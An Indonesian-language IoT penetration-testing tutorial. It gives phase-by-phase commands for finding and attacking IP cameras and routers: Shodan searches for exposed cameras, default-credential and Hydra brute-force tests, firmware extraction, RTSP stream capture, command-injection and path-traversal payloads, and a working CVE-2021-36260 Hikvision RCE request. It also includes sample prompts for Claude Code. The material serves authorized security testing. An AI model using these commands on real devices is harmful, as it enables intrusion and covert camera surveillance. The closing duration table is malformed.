# Hardware Pentest: IoT Devices

**Target:** Kamera IP, smart TV, smart lock, sensor, router IoT, industrial IoT  
**Durasi:** 2–4 hari per device  
**Akses:** Fisik ke device + akses jaringan

---

## Mengapa IoT Rentan

- Firmware jarang diupdate oleh pengguna
- Default credentials hampir tidak pernah diganti
- Berjalan OS Linux minimal tanpa patch
- Sering terekspos langsung ke internet
- Memory terbatas → tidak bisa jalankan security software

---

## Phase 1: IoT Discovery & Fingerprinting

```bash
# Temukan IoT di jaringan
sudo arp-scan -l | grep -iE "camera|hikvision|dahua|tp-link|xiaomi"
nmap -sV --script banner 192.168.1.0/24

# Shodan — cari IoT di internet
shodan search 'product:"Hikvision IP Camera"'
shodan search 'port:554 has_screenshot:true'  # RTSP camera dengan screenshot
shodan search 'product:"GoAhead" port:80'     # router pakai GoAhead webserver

# Identifikasi device
curl -I http://192.168.1.150       # HTTP banner
curl -s http://192.168.1.150/      # halaman default
nmap --script http-title 192.168.1.150
```

**Prompt Claude Code:**
```
IoT discovery di jaringan perusahaan:

Ditemukan:
- 192.168.1.150: Hikvision DS-2CD2142FWD-I (IP Camera)
- 192.168.1.151: Dahua IPC-HFW2831S (IP Camera)
- 192.168.1.155: TP-Link TL-WR841N (Router)
- 192.168.1.160: Xiaomi Mi Router 3 (Router)
- 192.168.1.170: Unknown device, port 80 → "GoAhead-Webs"

Untuk setiap device:
1. Default credentials yang umum
2. CVE yang diketahui
3. Attack vector prioritas
4. Apakah seharusnya device ini di network korporat?
```

---

## Phase 2: Default Credential Testing

```bash
# Cari default credentials
# Sumber: https://www.defaultpassword.com, RouterPasswords.com

# Hikvision kamera
curl -u admin:12345 http://192.168.1.150/ISAPI/System/deviceInfo
curl -u admin:admin http://192.168.1.150/

# Dahua kamera
curl -u admin:admin http://192.168.1.151/cgi-bin/snapshot.cgi

# Brute force IoT login (rate-limited karena device sering crash)
hydra -l admin -P /usr/share/wordlists/10k_most_common.txt \
  http-get 192.168.1.150 \
  -t 1 -w 5 -f
```

---

## Phase 3: Firmware Analysis

```bash
# Download firmware dari web interface device (jika bisa login)
curl -u admin:admin http://192.168.1.150/ISAPI/System/updateFirmware \
  -o firmware.bin

# Atau download dari vendor website
# Gunakan nomor model yang didapat dari fingerprinting

# Analisis firmware dengan binwalk
binwalk -e firmware.bin          # extract file system
binwalk -A firmware.bin          # cari CPU architecture
binwalk -E firmware.bin          # entropy analysis (cari enkripsi)

# Analisis file system yang diekstrak
ls -la _firmware.bin.extracted/
find _firmware.bin.extracted/ -name "*.conf" -o -name "*.cfg" | head -20
find _firmware.bin.extracted/ -name "shadow" -o -name "passwd"

# Cari hardcoded credentials
grep -r "password\|passwd\|secret\|key" _firmware.bin.extracted/ \
  --include="*.conf" --include="*.sh" --include="*.py"
```

**Prompt Claude Code:**
```
Binwalk berhasil extract firmware Hikvision DS-2CD2142FWD-I.

File system yang ditemukan:
- /etc/passwd: root:$1$salt$hashvalue (MD5 hash!)
- /etc/shadow: root:x
- /etc/lighttpd/lighttpd.conf: hardcoded API key ditemukan
- /usr/bin/: banyak binary setuid root
- /etc/init.d/: startup scripts

Dari strings pada binary /usr/bin/ipc:
Ditemukan: "hikmanage:Hik83220"  (hardcoded credential!)

Analisis:
1. MD5 password hash — crack dengan hashcat?
2. Hardcoded credential hikmanage:Hik83220 — apa yang bisa diakses?
3. Setuid binaries — potensi privilege escalation?
4. API key di konfigurasi — dampaknya?
5. CVE untuk Hikvision yang berkaitan dengan hardcoded credential
```

---

## Phase 4: RTSP Stream Access

```bash
# Kamera IP menggunakan RTSP untuk video stream
# Port: 554 (RTSP), 8554, 80 (HTTP streaming)

# Test akses RTSP tanpa autentikasi
ffmpeg -i rtsp://192.168.1.150:554/Streaming/Channels/101 -t 5 output.mp4

# Dengan credential default
ffmpeg -i rtsp://admin:admin@192.168.1.150:554/Streaming/Channels/101 \
  -t 5 output.mp4

# Cari URL stream Hikvision
# rtsp://IP/Streaming/Channels/101 (main stream)
# rtsp://IP/Streaming/Channels/102 (sub stream)

# Cari dengan Shodan
shodan search 'rtsp has_screenshot:true "Hikvision"'
```

---

## Phase 5: IoT Web Interface Testing

```bash
# Test web interface untuk kerentanan umum

# Command injection pada ping test di router
curl -X POST http://192.168.1.155/goform/ping \
  -d "ip=8.8.8.8; cat /etc/passwd"

# Path traversal
curl http://192.168.1.155/../../../../etc/passwd

# Unauthenticated API endpoints
curl http://192.168.1.150/ISAPI/System/deviceInfo  # tanpa auth
curl http://192.168.1.150/cgi-bin/snapshot.cgi     # ambil screenshot
```

---

## Phase 6: Eksploitasi CVE IoT Spesifik

```bash
# Hikvision backdoor (CVE-2021-36260) — unauthenticated RCE
# Command injection via HTTP request

curl -X PUT "http://192.168.1.150/SDK/webLanguage" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data $'<?xml version="1.0" encoding="UTF-8"?><language>$(id>webLib/x)</language>'

# Cek hasil RCE
curl http://192.168.1.150/x

# Metasploit modules untuk IoT
msfconsole
search hikvision
search dahua
use auxiliary/scanner/http/hikvision_unauth_bypass
```

---

## Checklist IoT Device Pentest

```
[ ] Discovery IoT di jaringan
[ ] Fingerprint: vendor, model, versi firmware
[ ] Cari CVE untuk device ini
[ ] Test default credentials (web, SSH, Telnet, RTSP)
[ ] Firmware download dan analisis (binwalk)
[ ] Cari hardcoded credentials di firmware
[ ] Test web interface (command injection, path traversal)
[ ] Test RTSP stream access
[ ] Cek apakah device perlu di-segment dari jaringan utama
[ ] Laporan: risk dari setiap device + rekomendasi hardening
```

---

## Durasi Estimasi

| Sub-skenario | Durasi |
|-------------|-----------|----------|
| Per device (discovery + default creds + CVE) | 0.5–1 hari | 1–2 hari |
| Per device (termasuk firmware analysis) | 1–2 hari | 3–5 hari |
| Multiple devices (5–10 device) | 3–5 hari | 8–15 hari |
